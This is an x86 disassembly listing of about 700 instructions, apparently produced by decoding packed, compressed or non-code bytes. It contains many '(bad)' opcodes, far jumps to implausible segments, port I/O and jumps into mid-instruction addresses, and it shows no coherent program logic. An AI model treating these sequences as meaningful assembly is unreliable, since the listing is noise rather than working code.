  40dd06:	jmp    0x2ab54419
  40dd0b:	jno    0x40dd77
  40dd0d:	cmp    BYTE PTR [ecx+0x7b],dl
  40dd10:	add    dh,BYTE PTR [ebx]
  40dd12:	xchg   esi,eax
  40dd13:	add    BYTE PTR [eax],al
  40dd15:	add    BYTE PTR [eax],al
  40dd17:	add    al,bh
  40dd19:	cmc    
  40dd1a:	fbld   TBYTE PTR [eax-0x24]
  40dd1d:	pop    edx
  40dd1e:	imul   ebp,ebx,0x248ccfc7
  40dd24:	pop    ecx
  40dd25:	(bad)  
  40dd26:	(bad)  
  40dd27:	cld    
  40dd28:	jb     0x40dda1
  40dd2a:	xor    al,0x6d
  40dd2c:	push   ebp
  40dd2d:	(bad)  
  40dd2e:	call   edx
  40dd30:	aas    
  40dd31:	mov    WORD PTR [ebp*2+0x55ffc288],?
  40dd38:	inc    edi
  40dd39:	jle    0x40dcfa
  40dd3b:	aam    0x77
  40dd3d:	xor    al,0xc0
  40dd3f:	push   eax
  40dd40:	or     esi,DWORD PTR [edi-0x2]
  40dd43:	jmp    0x9e97dde8
  40dd48:	std    
  40dd49:	mov    ebp,0xedff99db
  40dd4e:	or     esp,DWORD PTR [esi]
  40dd50:	inc    esp
  40dd51:	add    ah,ch
  40dd53:	stos   BYTE PTR es:[edi],al
  40dd54:	jbe    0x40dd3e
  40dd56:	(bad)  
  40dd57:	push   ss
  40dd58:	(bad)  
  40dd59:	jle    0x40dd1a
  40dd5b:	xchg   ebp,eax
  40dd5c:	(bad)  
  40dd5d:	fnsave [ebx]
  40dd5f:	icebp  
  40dd60:	jbe    0x40dd64
  40dd62:	push   0xfffffff1
  40dd64:	iret   
  40dd65:	fcomp  DWORD PTR cs:[edi]
  40dd68:	xor    dh,BYTE PTR [esi-0x3]
  40dd6b:	aam    0x62
  40dd6d:	adc    eax,DWORD PTR [eax-0x17]
  40dd70:	jmp    0x40ddbf
  40dd72:	mov    BYTE PTR [ecx+edx*8],bh
  40dd75:	cmp    bh,bl
  40dd77:	pop    ebp
  40dd78:	mov    ch,0xeb
  40dd7a:	add    BYTE PTR [ecx+0x0],dl
  40dd80:	add    BYTE PTR [edi+0xc00fe75],bl
  40dd86:	jmp    0x388:0x21d3ca4
  40dd8d:	xor    DWORD PTR [ecx],0x8
  40dd90:	add    BYTE PTR [edi+eax*4],cl
  40dd93:	jns    0x40dd99
  40dd95:	retf   
  40dd96:	cmp    al,0xa
  40dd98:	and    ah,bl
  40dd9a:	add    DWORD PTR [eax],eax
  40dd9c:	lea    ebx,[edi+0x18e8500e]
  40dda2:	loope  0x40dda1
  40dda4:	jmp    DWORD PTR [edi+0x42]
  40dda7:	fimul  WORD PTR [ecx+0x458b3a9f]
  40ddad:	loopne 0x40dd35
  40ddaf:	inc    ecx
  40ddb0:	inc    eax
  40ddb1:	and    DWORD PTR [edx-0x7ac0320],esi
  40ddb7:	out    0x21,al
  40ddb9:	mov    eax,0x34500001
  40ddbe:	mov    edi,0xb68c0063
  40ddc3:	in     al,dx
  40ddc4:	add    DWORD PTR [ecx+eax*1+0x15ac68b],ecx
  40ddcb:	add    BYTE PTR [eax-0x2b],al
  40ddce:	jb     0x40ddc7
  40ddd0:	(bad)  
  40ddd1:	sbb    ecx,edx
  40ddd3:	cld    
  40ddd4:	call   DWORD PTR [ebx+0x75]
  40ddd7:	(bad)  
  40ddd8:	call   FWORD PTR [esp+eax*4-0x2b]
  40dddc:	mov    ecx,DWORD PTR [edi+0x72d0838a]
  40dde2:	clc    
  40dde3:	std    
  40dde4:	call   0x40dde9
  40dde9:	add    al,ah
  40ddeb:	cmp    al,0xfe
  40dded:	call   FWORD PTR [edx-0x20fef2be]
  40ddf3:	(bad)  
  40ddf4:	cli    
  40ddf5:	add    bh,dl
  40ddf7:	jb     0x40ddff
  40ddf9:	call   FWORD PTR [edx+0x53006a06]
  40ddff:	jo     0x40de03
  40de01:	push   DWORD PTR [ebp+0x76]
  40de04:	rcl    BYTE PTR ds:0xc3836bb5,cl
  40de0a:	imul   edx,DWORD PTR [edx*8+0x775f8bfe],0xc255b914
  40de15:	push   edi
  40de17:	sahf   
  40de18:	pop    es
  40de19:	sub    DWORD PTR [eax-0x78158761],0x58
  40de20:	inc    edx
  40de21:	aas    
  40de22:	mov    dh,0xdf
  40de24:	fsubrp st(7),st
  40de26:	mov    ebx,0xf600091d
  40de2b:	sub    eax,0x15fefe78
  40de30:	pop    esp
  40de31:	push   edx
  40de32:	ffree  st(7)
  40de34:	mov    ah,0x0
  40de36:	jne    0x40de19
  40de38:	mov    esi,0x9fb3cd0e
  40de3d:	add    DWORD PTR [ebp+0x29],esi
  40de40:	or     al,0x0
  40de42:	inc    eax
  40de43:	loopne 0x40deac
  40de45:	adc    BYTE PTR [ecx-0x65000166],0x94
  40de4c:	iret   
  40de4d:	mov    WORD PTR [eax],es
  40de4f:	add    BYTE PTR [eax],al
  40de51:	add    BYTE PTR [eax],al
  40de53:	rcr    BYTE PTR [edx-0x3d750184],1
  40de59:	(bad)  
  40de5a:	push   ds
  40de5b:	ja     0x40dec8
  40de5d:	mov    esi,DWORD PTR [ecx+esi*1-0x220186e3]
  40de64:	fsin   
  40de66:	jmp    FWORD PTR [edx-0x1f]
  40de69:	inc    eax
  40de6a:	imul   esi,DWORD PTR [ebp-0x47],0x53c51477
  40de71:	ret    0xf7ff
  40de74:	sbb    eax,0xf62e8508
  40de79:	add    al,0x89
  40de7b:	xchg   BYTE PTR [eax+0x3438442],bh
  40de81:	inc    esi
  40de82:	or     DWORD PTR [ecx],ecx
  40de84:	inc    ebx
  40de85:	ds dec ebx
  40de87:	aaa    
  40de88:	jmp    0x40de96
  40de8a:	add    esi,DWORD PTR [ebp+0x2]
  40de8d:	inc    ecx
  40de8e:	mov    eax,fs:0x3c6be8bf
  40de94:	popf   
  40de95:	jmp    0x22d6:0x5f574603
  40de9c:	xchg   BYTE PTR [ebx],ah
  40de9e:	push   eax
  40de9f:	stos   BYTE PTR es:[edi],al
  40dea0:	jae    0x40de9d
  40dea2:	add    eax,DWORD PTR [esi-0x142c173e]
  40dea8:	or     eax,0x235153d
  40dead:	pusha  
  40deae:	mov    esi,0x8aa37be
  40deb3:	stc    
  40deb4:	adc    ch,al
  40deb6:	add    eax,DWORD PTR [eax]
  40deb8:	add    BYTE PTR [eax],al
  40deba:	add    BYTE PTR [eax],al
  40debc:	jne    0x40def7
  40debe:	adc    al,0x50
  40dec0:	inc    eax
  40dec1:	xor    eax,0x879ebe62
  40dec6:	sbb    al,0x9c
  40dec8:	stc    
  40dec9:	ins    BYTE PTR es:[edi],dx
  40deca:	aam    0x2b
  40decc:	pop    ds
  40decd:	add    cl,al
  40decf:	retf   
  40ded0:	es ret 0xd1e8
  40ded4:	fwait
  40ded5:	or     eax,0x2351485
  40deda:	fs inc ebx
  40dedc:	add    DWORD PTR [esp+eiz*2],ecx
  40dedf:	shl    DWORD PTR [esi-0x7b],1
  40dee2:	stos   DWORD PTR es:[edi],eax
  40dee3:	pop    ebx
  40dee4:	xchg   edx,eax
  40dee5:	mov    ebx,gs
  40dee7:	add    esi,DWORD PTR [ebp+0x7d]
  40deea:	sub    dh,ch
  40deec:	jae    0x40de75
  40deee:	stos   DWORD PTR es:[edi],eax
  40deef:	pop    ebx
  40def0:	stc    
  40def1:	inc    ecx
  40def2:	xchg   ebx,eax
  40def3:	or     esi,DWORD PTR [esi-0x31b05bc9]
  40def9:	dec    edx
  40defa:	adc    DWORD PTR [esp+edi*8],eax
  40defd:	mov    esp,0xeebd08ff
  40df02:	fucomi st,st(6)
  40df04:	push   0x7929118a
  40df09:	jg     0x40df87
  40df0b:	leave  
  40df0c:	jno    0x40df11
  40df0e:	test   BYTE PTR [edx+0x6a000279],dl
  40df14:	sbb    al,0x53
  40df16:	(bad)  
  40df17:	not    BYTE PTR [edx+0x76e8ffb2]
  40df1d:	mov    ah,0xff
  40df1f:	fadd   DWORD PTR [eax]
  40df21:	add    BYTE PTR [eax],al
  40df23:	add    BYTE PTR [eax],al
  40df25:	jbe    0x40df29
  40df27:	push   esi
  40df28:	shl    ebx,0xb0
  40df2b:	add    cl,ch
  40df2d:	jmp    FWORD PTR [edx-0x78]
  40df30:	sbb    al,0x49
  40df32:	jle    0x40df32
  40df34:	out    0x62,al
  40df36:	call   0xe969:0xcc76e8ff
  40df3d:	fdiv   QWORD PTR [edx+0x68]
  40df40:	in     eax,0xaf
  40df42:	iret   
  40df43:	(bad)  
  40df44:	cld    
  40df45:	push   esi
  40df46:	je     0x40df5c
  40df48:	push   ecx
  40df49:	addr16 ret 0x6fff
  40df4d:	mov    ah,0x56
  40df4f:	test   BYTE PTR [ecx],ch
  40df51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df52:	rol    BYTE PTR [edx+0x54732acc],0xb9
  40df59:	stos   DWORD PTR es:[edi],eax
  40df5a:	jae    0x40df70
  40df5c:	mov    ch,0x80
  40df5e:	ret    0x69ff
  40df61:	xor    eax,0x2d548907
  40df66:	jne    0x40df66
  40df68:	cs out dx,al
  40df6a:	dec    esp
  40df6b:	mov    dh,BYTE PTR [esi]
  40df6d:	cld    
  40df6e:	xchg   bl,cl
  40df70:	pop    ds
  40df71:	loop   0x40dfe3
  40df73:	out    0xe4,eax
  40df75:	aaa    
  40df76:	jb     0x40df76
  40df78:	push   0x2c
  40df7a:	outs   dx,BYTE PTR ds:[esi]
  40df7b:	inc    BYTE PTR [eax]
  40df7d:	or     BYTE PTR [bp+di],dh
  40df80:	rcr    BYTE PTR [eax*8-0x7a8b9a77],0x4b
  40df88:	cld    
  40df89:	add    BYTE PTR [eax],al
  40df8b:	add    BYTE PTR [eax],al
  40df8d:	add    BYTE PTR [ebx+0x7d],cl
  40df90:	jnp    0x40df6a
  40df92:	sbb    esi,DWORD PTR [ebx-0x26]
  40df95:	jmp    DWORD PTR [ecx]
  40df97:	adc    BYTE PTR [eax],0x40
  40df9a:	or     al,0xae
  40df9c:	or     BYTE PTR cs:[esi+eax*1],cl
  40dfa0:	cmp    DWORD PTR [edi+0x20],eax
  40dfa3:	bound  ecx,QWORD PTR [ebx]
  40dfa5:	push   edi
  40dfa6:	xchg   DWORD PTR [edx+0x6],ecx
  40dfa9:	call   0x40e510
  40dfae:	xchg   esi,eax
  40dfaf:	int    0xe9
  40dfb1:	adc    BYTE PTR [ecx+eax*2-0x71b8a03],ch
  40dfb8:	adc    ecx,DWORD PTR [edx+eiz*8+0x45]
  40dfbc:	inc    BYTE PTR [edx+0x1b30a10]
  40dfc2:	jae    0x40dfa2
  40dfc4:	daa    
  40dfc5:	mov    dl,0xdd
  40dfc7:	add    eax,0xfac0db84
  40dfcc:	(bad)  
  40dfcd:	jne    0x40dfbb
  40dfcf:	clc    
  40dfd0:	adc    eax,DWORD PTR [edi+ebp*4]
  40dfd3:	inc    ebp
  40dfd4:	(bad)  
  40dfd5:	scas   eax,DWORD PTR es:[edi]
  40dfd6:	popf   
  40dfd7:	fadd   QWORD PTR [eax]
  40dfd9:	xor    cl,BYTE PTR [ebp+ebx*8-0x35]
  40dfdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfde:	mov    es,WORD PTR ds:0x2e9c04c2
  40dfe4:	in     al,dx
  40dfe5:	or     eax,0x609d7de8
  40dfea:	jg     0x40e029
  40dfec:	arpl   cx,sp
  40dfee:	imul   edi,DWORD PTR [eax],0x31
  40dff1:	mov    dh,0x0
  40dff3:	add    BYTE PTR [eax],al
  40dff5:	add    BYTE PTR [eax],al
  40dff7:	mov    BYTE PTR [eax+0x7997b5ec],ah
  40dffd:	jmp    0x7b99:0x2c507518
  40e004:	cmp    ebp,DWORD PTR [edx-0x5a]
  40e007:	jmp    0x7de7b52e
  40e00c:	inc    edi
  40e00d:	out    0x66,al
  40e00f:	push   esp
  40e010:	cwde   
  40e011:	adc    ebp,DWORD PTR [edi+0x55]
  40e014:	(bad)
  40e017:	adc    ebp,DWORD PTR [edi+eax*8+0x112f1210]
  40e01e:	imul   esi,DWORD PTR [edi+eax*4],0xffffff88
  40e022:	jmp    0x40dff7
  40e024:	cmp    ebp,DWORD PTR [edx-0x5a]
  40e027:	call   0x1d917ce
  40e02c:	shl    ch,0x26
  40e02f:	adc    al,0xf
  40e031:	sub    DWORD PTR [edi],esp
  40e033:	xchg   ecx,eax
  40e034:	inc    eax
  40e035:	sbb    ch,BYTE PTR [ecx+0x57]
  40e038:	inc    eax
  40e039:	(bad)  
  40e03a:	adc    bl,ch
  40e03c:	aad    0x90
  40e03e:	and    DWORD PTR ss:[ebp-0x5feb8c0d],0x5c
  40e046:	(bad)  
  40e047:	popa   
  40e048:	fmul   st(3),st
  40e04a:	es jl  0x40e022
  40e04d:	add    eax,0xfc2dd467
  40e052:	jmp    0x65fad4a7
  40e057:	xchg   esp,eax
  40e058:	(bad)  
  40e059:	aaa    
  40e05a:	push   esp
  40e05b:	add    BYTE PTR [eax],al
  40e05d:	add    BYTE PTR [eax],al
  40e05f:	add    BYTE PTR [edi-0x21],ch
  40e062:	bound  edx,QWORD PTR [edx]
  40e064:	mov    eax,0x7bae64d3
  40e069:	sbb    BYTE PTR [ecx],cl
  40e06b:	lock xchg ebp,eax
  40e06d:	daa    
  40e06e:	push   edx
  40e06f:	out    0x4a,al
  40e071:	iret   
  40e072:	out    0xe1,eax
  40e074:	push   esp
  40e075:	jp     0x40e066
  40e077:	jmp    0x3731144c
  40e07c:	sub    al,BYTE PTR [ebx]
  40e07e:	leave  
  40e07f:	sbb    esi,DWORD PTR [esi+0x6ced569]
  40e085:	bound  esi,QWORD PTR ds:0xa261136b
  40e08b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e08c:	mov    cl,0x24
  40e08e:	push   ebx
  40e08f:	fistp  WORD PTR [esi-0x62]
  40e092:	add    eax,edi
  40e094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e095:	and    DWORD PTR [eax],esi
  40e097:	pop    edi
  40e098:	rcr    dh,1
  40e09a:	push   ecx
  40e09b:	int3   
  40e09c:	pop    ebx
  40e09d:	mov    cl,0x1d
  40e09f:	shl    DWORD PTR [edi+0x61],1
  40e0a2:	mov    ebp,0x821098fd
  40e0a7:	retf   
  40e0a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0a9:	fidiv  WORD PTR [ecx-0x35]
  40e0ac:	arpl   WORD PTR [ecx+0x61d1eafd],si
  40e0b2:	popf   
  40e0b3:	imul   ebx,ebx,0xffffff96
  40e0b6:	mov    eax,ds:0x8d62ed4e
  40e0bb:	out    0xdc,eax
  40e0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0be:	mov    eax,ds:0x7d69da27
  40e0c3:	push   ds
  40e0c4:	add    BYTE PTR [eax],al
  40e0c6:	add    BYTE PTR [eax],al
  40e0c8:	add    BYTE PTR [edi-0x2d420f5],al
  40e0ce:	adc    cl,cl
  40e0d0:	bound  edx,QWORD PTR [edi-0x7bc84abb]
  40e0d6:	stc    
  40e0d7:	sbb    bh,BYTE PTR [edx+ebx*2]
  40e0da:	popa   
  40e0db:	adc    DWORD PTR [eax+0x2c1a7367],ebp
  40e0e1:	ss jno 0x40e159
  40e0e4:	data16 or ch,BYTE PTR [esi]
  40e0e7:	aas    
  40e0e8:	out    0x1b,eax
  40e0ea:	mov    eax,0xd6cb7f5f
  40e0ef:	cs out 0xad,eax
  40e0f2:	jmp    DWORD PTR [esi]
  40e0f4:	out    0x13,eax
  40e0f6:	mov    bh,0x9a
  40e0f8:	sub    esi,DWORD PTR [esi]
  40e0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0fb:	jmp    DWORD PTR [ebp+0x7a]
  40e0fe:	inc    eax
  40e0ff:	add    cl,BYTE PTR [ebp+0x5a]
  40e102:	xchg   edi,eax
  40e103:	repz jp 0x40e172
  40e106:	sub    cl,ah
  40e108:	mov    ebp,0x726bdc0e
  40e10d:	sub    BYTE PTR cs:[ecx+0x26],ch
  40e111:	call   0xbde5:0xa2cc9419
  40e118:	push   0x6b035e91
  40e11d:	mov    ah,0x3
  40e11f:	add    BYTE PTR [ebp+edi*8-0x2a2a7fa6],dl
  40e126:	outs   dx,BYTE PTR ds:[esi]
  40e127:	(bad)  
  40e128:	jmp    0x4397b678
  40e12d:	add    BYTE PTR [eax],al
  40e12f:	add    BYTE PTR [eax],al
  40e131:	add    BYTE PTR [ebp+0x7d],dh
  40e134:	inc    esp
  40e135:	mov    cl,0x31
  40e137:	xlat   BYTE PTR ds:[ebx]
  40e138:	(bad)  [edx]
  40e13a:	jno    0x40e16f
  40e13c:	fstp   TBYTE PTR [edi+0x79]
  40e13f:	adc    al,BYTE PTR [eax]
  40e141:	jmp    0xb19d5b6c
  40e146:	jo     0x40e13e
  40e148:	sti    
  40e149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14a:	mov    WORD PTR [esi-0x7c86d6eb],?
  40e150:	ret    
  40e151:	in     eax,0xc3
  40e153:	aam    0x52
  40e155:	add    DWORD PTR [ebp+0x2],edi
  40e158:	add    cl,dh
  40e15a:	cmc    
  40e15b:	(bad)
  40e15e:	mov    ds:0x512cc66f,eax
  40e163:	add    al,BYTE PTR [eax]
  40e165:	jmp    0x755550e0
  40e16a:	add    edx,0xffffffff
  40e16d:	jno    0x40e180
  40e16f:	jp     0x40e1ed
  40e171:	pop    ebp
  40e172:	dec    edx
  40e173:	imul   esi,DWORD PTR [ebx-0xe],0xffffffac
  40e177:	rcl    DWORD PTR [edx+0x0],cl
  40e17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e17b:	clc    
  40e17c:	push   esi
  40e17d:	jmp    FWORD PTR [ecx-0x73bfef86]
  40e183:	in     eax,dx
  40e184:	inc    ebx
  40e185:	clc    
  40e186:	lds    esi,FWORD PTR [bp+di+0x19]
  40e18a:	loope  0x40e1f7
  40e18c:	bnd call 0x3ebf63
  40e192:	shr    DWORD PTR [ebx-0xe],1
  40e195:	call   0x40e19a
  40e19a:	add    cl,bl
  40e19c:	(bad)  
  40e19e:	dec    DWORD PTR [esi]
  40e1a0:	ret    0x5e5d
  40e1a3:	pop    ss
  40e1a4:	das    
  40e1a5:	ror    DWORD PTR [eax],0x4c
  40e1a8:	call   0x5d38:0x1dc744e
  40e1af:	and    BYTE PTR [ebx+0x3],ch
  40e1b2:	mov    eax,0x3e6ab4
  40e1b7:	pop    esp
  40e1b8:	dec    ecx
  40e1b9:	pop    sp
  40e1bb:	test   al,0x46
  40e1bd:	(bad)  
  40e1be:	push   edx
  40e1bf:	cmp    DWORD PTR [edx+0x52],0x4ef0c3ff
  40e1c6:	push   0x22
  40e1c8:	aas    
  40e1c9:	out    0x64,al
  40e1cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1cc:	pop    es
  40e1cd:	add    BYTE PTR [ebx-0x3f7ae9e8],al
  40e1d3:	mov    esp,eax
  40e1d5:	push   0x923a5140
  40e1da:	push   ebx
  40e1db:	mov    esi,cs
  40e1dd:	es lahf 
  40e1df:	fiadd  WORD PTR [ecx]
  40e1e1:	xor    eax,eax
  40e1e3:	inc    ebp
  40e1e4:	push   edx
  40e1e5:	loop   0x40e174
  40e1e7:	ror    ecx,0xa9
  40e1ea:	sbb    eax,0x6d
  40e1ed:	test   eax,0xe23a21ab
  40e1f2:	push   eax
  40e1f3:	adc    DWORD PTR [edx],edi
  40e1f5:	mov    ss,WORD PTR [eax+0x75]
  40e1f8:	test   al,0xd5
  40e1fa:	imul   edi,DWORD PTR [ecx+0x41],0x5303
  40e201:	add    BYTE PTR [eax],al
  40e203:	add    BYTE PTR [esi],ah
  40e205:	test   BYTE PTR [edi+0x722c8253],0x4f
  40e20c:	jp     0x40e1bc
  40e20e:	cli    
  40e20f:	(bad)  
  40e210:	mov    eax,0x6affc6cb
  40e215:	pop    ebx
  40e216:	jno    0x40e22c
  40e218:	add    eax,0xf1ffc269
  40e21d:	sbb    bh,al
  40e21f:	push   cs
  40e220:	add    BYTE PTR [esi+0x77e776],dl
  40e226:	jb     0x40e226
  40e228:	out    dx,eax
  40e229:	pop    ss
  40e22a:	pop    esp
  40e22b:	ja     0x40e267
  40e22d:	je     0x40e29f
  40e22f:	(bad)  
  40e230:	test   al,0x7
  40e232:	add    BYTE PTR [ecx+eiz*1+0x2b],0x5c
  40e237:	adc    DWORD PTR [esi],ebx
  40e239:	dec    esp
  40e23a:	jo     0x40e1bf
  40e23c:	xor    eax,0x88ff13cf
  40e241:	inc    ebx
  40e242:	jo     0x40e258
  40e244:	cmc    
  40e245:	dec    eax
  40e246:	ret    0xf7ff
  40e249:	inc    edx
  40e24a:	jo     0x40e2bf
  40e24c:	ja     0x40e236
  40e24e:	add    bh,bh
  40e250:	push   0x71347c47
  40e255:	push   0xb4e3ffc2
  40e25a:	jo     0x40e2d0
  40e25c:	int    0x93
  40e25e:	pop    ecx
  40e25f:	jmp    0x35fe:0xeb7d3612
  40e266:	cld    
  40e267:	add    BYTE PTR [eax],0x0
  40e26a:	add    BYTE PTR [eax],al
  40e26c:	add    cl,dl
  40e26e:	pop    esi
  40e26f:	add    al,0x0
  40e271:	jne    0x40e27b
  40e273:	ficom  DWORD PTR [esi+0x66]
  40e276:	fwait
  40e277:	xor    al,0xf6
  40e279:	popf   
  40e27a:	add    DWORD PTR [eax+edx*2],esi
  40e27d:	mov    ds:0x2644636c,al
  40e282:	sbb    BYTE PTR [esi-0x3c],bl
  40e285:	jbe    0x40e289
  40e287:	jmp    0xd837478f
  40e28c:	jl     0x40e308
  40e28e:	cmp    DWORD PTR [edi],0x6bf80724
  40e294:	jp     0x40e27c
  40e296:	push   es
  40e297:	repnz add ebx,esp
  40e29a:	add    BYTE PTR [edx+0x74],dh
  40e29d:	out    dx,eax
  40e29e:	mov    ebp,0x4f135bf0
  40e2a3:	call   0x9383daab
  40e2a8:	dec    ebp
  40e2a9:	icebp  
  40e2aa:	je     0x40e327
  40e2ac:	pop    es
  40e2ad:	xchg   DWORD PTR [edx+0x11],eax
  40e2b0:	idiv   DWORD PTR [edx-0x57fc1b13]
  40e2b6:	add    eax,0xf655326a
  40e2bb:	xlat   BYTE PTR ds:[ebx]
  40e2bc:	jo     0x40e267
  40e2be:	cli    
  40e2bf:	jno    0x40e2b2
  40e2c1:	outs   dx,BYTE PTR ds:[esi]
  40e2c2:	pop    edx
  40e2c3:	into   
  40e2c4:	dec    edi
  40e2c5:	adc    ch,BYTE PTR [ecx+eiz*2+0x4b]
  40e2c9:	icebp  
  40e2ca:	inc    edi
  40e2cb:	cmp    al,0x64
  40e2cd:	icebp  
  40e2ce:	test   eax,eax
  40e2d0:	outs   dx,BYTE PTR ds:[esi]
  40e2d1:	add    BYTE PTR [eax],al
  40e2d3:	add    BYTE PTR [eax],al
  40e2d5:	add    bl,bh
  40e2d7:	imul   ebx,DWORD PTR [eax],0xffffffdc
  40e2da:	pop    esi
  40e2db:	imul   BYTE PTR [eax]
  40e2dd:	add    al,0xb3
  40e2df:	(bad)
  40e2e2:	int    0x4b
  40e2e4:	jmp    0x40e2eb
  40e2e6:	jne    0x40e26e
  40e2e8:	test   al,0xf7
  40e2ea:	mov    edx,ebx
  40e2ec:	cmp    DWORD PTR [edi-0xf],edi
  40e2ef:	push   0xffffff83
  40e2f1:	jo     0x40e2b6
  40e2f3:	rcl    BYTE PTR [eax+0x6ea6],cl
  40e2f9:	jmp    0xc4b48ef8
  40e2fe:	icebp  
  40e2ff:	sub    eax,0xac0af620
  40e304:	push   cs
  40e305:	xchg   edi,eax
  40e306:	ss mov ebx,0x6e1e6c8c
  40e30c:	dec    BYTE PTR [esi-0x5a]
  40e30f:	arpl   WORD PTR [eax],bp
  40e311:	inc    edi
  40e312:	add    eax,0x75a4876c
  40e317:	jge    0x40e29d
  40e319:	xor    ebx,esp
  40e31b:	ins    BYTE PTR es:[edi],dx
  40e31c:	(bad)  
  40e31d:	cdq    
  40e31e:	into   
  40e31f:	fist   DWORD PTR [edx-0x17]
  40e322:	jbe    0x40e2f3
  40e324:	out    0x16,eax
  40e326:	adc    al,0x2
  40e328:	add    BYTE PTR [ebx+0x3b],ah
  40e32b:	cld    
  40e32c:	pop    esi
  40e32d:	scas   eax,DWORD PTR es:[edi]
  40e32e:	cmp    DWORD PTR [edx],edi
  40e330:	shl    ecx,0x76
  40e333:	aad    0x8a
  40e335:	or     eax,0xe8f356f7
  40e33a:	add    BYTE PTR [eax],al
  40e33c:	add    BYTE PTR [eax],al
  40e33e:	add    BYTE PTR [esi+0x2],dh
  40e341:	push   esi
  40e342:	bound  esp,QWORD PTR [ebx]
  40e344:	add    eax,DWORD PTR [ecx+0x8117867]
  40e34a:	jmp    0xeeb4b6c5
  40e34f:	inc    esp
  40e350:	inc    edx
  40e351:	call   0x4353a0
  40e356:	xchg   BYTE PTR [ecx-0x6],cl
  40e359:	(bad)  
  40e35a:	call   0x1a40bc82
  40e35f:	bound  edx,QWORD PTR [esi]
  40e361:	push   eax
  40e362:	xlat   BYTE PTR ds:[ebx]
  40e363:	mov    dh,0x6a
  40e365:	xchg   DWORD PTR [edx],esp
  40e367:	ins    DWORD PTR es:[edi],dx
  40e368:	ja     0x40e3af
  40e36a:	lock idiv DWORD PTR [esi]
  40e36d:	or     esp,DWORD PTR [eax-0x4a]
  40e370:	test   BYTE PTR [edi+eiz*1+0x69d274],0xa1
  40e378:	cmp    ecx,DWORD PTR [ebx-0x3a1863b5]
  40e37e:	call   0x405709
  40e383:	pop    ss
  40e384:	inc    esp
  40e385:	xor    eax,0x8b1acf89
  40e38a:	inc    esi
  40e38b:	push   edi
  40e38c:	in     eax,dx
  40e38d:	inc    ecx
  40e38e:	inc    eax
  40e38f:	sbb    DWORD PTR [ebp+eax*2+0x50],eax
  40e393:	mov    dh,0x1a
  40e395:	pop    edi
  40e396:	(bad)  
  40e397:	(bad)  
  40e398:	stos   BYTE PTR es:[edi],al
  40e399:	mov    edi,eax
  40e39b:	and    al,0x31
  40e39d:	ja     0x40e3a0
  40e39f:	pop    esp
  40e3a0:	in     eax,dx
  40e3a1:	test   BYTE PTR [edi+0x0],bh
  40e3a7:	add    BYTE PTR [esi+eax*1+0x0],bl
  40e3ab:	mov    ebx,DWORD PTR [ecx-0x56]
  40e3ae:	adc    al,0x40
  40e3b0:	dec    esp
  40e3b1:	out    0x81,eax
  40e3b3:	les    ebx,FWORD PTR [esi+eax*1+0x0]
  40e3b7:	push   0x4c
  40e3b9:	add    DWORD PTR [ebx+eax*8+0x5000064c],0xffffffc9
  40e3c1:	test   esi,eax
  40e3c3:	add    BYTE PTR [esi+eax*1],bl
  40e3c6:	push   eax
  40e3c7:	inc    DWORD PTR [ebx-0x3bf33d7b]
  40e3cd:	add    al,0x1
  40e3cf:	add    BYTE PTR [ebx+eax*4],cl
  40e3d2:	test   bl,dl
  40e3d4:	sbb    al,0x6
  40e3d6:	add    BYTE PTR [eax-0x57],dl
  40e3d9:	test   dh,dl
  40e3db:	add    BYTE PTR [esi+eax*1],cl
  40e3de:	push   eax
  40e3df:	jmp    ebx
  40e3e1:	test   dl,al
  40e3e3:	or     al,0x6b
  40e3e5:	add    DWORD PTR [ecx],eax
  40e3e7:	add    ah,bl
  40e3e9:	jle    0x40e3af
  40e3eb:	aad    0xcd
  40e3ed:	add    eax,0xec495600
  40e3f2:	fiadd  DWORD PTR [ecx]
  40e3f4:	jne    0x40e451
  40e3f6:	add    cl,BYTE PTR [ebx+0x756783b2]
  40e3fc:	je     0x40e459
  40e3fe:	xchg   DWORD PTR [edi-0x12d2196],edi
  40e404:	mov    dl,0xf0
  40e406:	fadd   DWORD PTR [eax]
  40e408:	clc    
  40e409:	cs adc edi,esi
  40e40c:	add    BYTE PTR [eax],al
  40e40e:	add    BYTE PTR [eax],al
  40e410:	add    BYTE PTR [edx+0x3b3e5ae0],ah
  40e416:	pop    ebx
  40e417:	add    cl,BYTE PTR [ebx+0x5f5aabbb]
  40e41d:	pop    esp
  40e41e:	pop    ebp
  40e41f:	add    al,BYTE PTR [ebp+esi*4-0x7446ee5a]
  40e426:	pop    edx
  40e427:	add    al,BYTE PTR [eax]
  40e429:	(bad)  
  40e42a:	sbb    BYTE PTR [ebp-0x1],al
  40e42d:	push   0xffffff9b
  40e42f:	mov    ebx,0x27125c74
  40e434:	call   FWORD PTR [edx+0x8]
  40e437:	(bad)  
  40e438:	mov    WORD PTR [eax+0x68cd31d],?
  40e43e:	adc    eax,DWORD PTR [edx]
  40e440:	add    BYTE PTR [ebp-0x6b],dh
  40e443:	add    al,BYTE PTR [ebx-0x42a697d3]
  40e449:	push   es
  40e44a:	pop    edx
  40e44b:	add    al,BYTE PTR [ebp-0x46ea27cb]
  40e451:	adc    ebx,DWORD PTR [edx+0x2]
  40e454:	add    al,ch
  40e456:	fst    QWORD PTR [ebx]
  40e458:	(bad)  
  40e459:	adc    dl,BYTE PTR [eax+0x45]
  40e45c:	dec    DWORD PTR [edx]
  40e45e:	sbb    edi,DWORD PTR [ebx+0x7751fc74]
  40e464:	std    
  40e465:	cli    
  40e466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e467:	js     0x40e4ad
  40e469:	shl    ecx,cl
  40e46b:	add    BYTE PTR [edi],0x73
  40e46e:	pop    ebx
  40e46f:	add    ch,BYTE PTR [edx+0x6d]
  40e472:	add    dh,BYTE PTR [edi+eax*8+0x0]
  40e476:	add    BYTE PTR [eax],al
  40e478:	add    BYTE PTR [eax],al
  40e47a:	rcl    cl,0x6b
  40e47d:	adc    edx,0x2503e8fe
  40e483:	imul   esi,ebx,0xe8c268bf
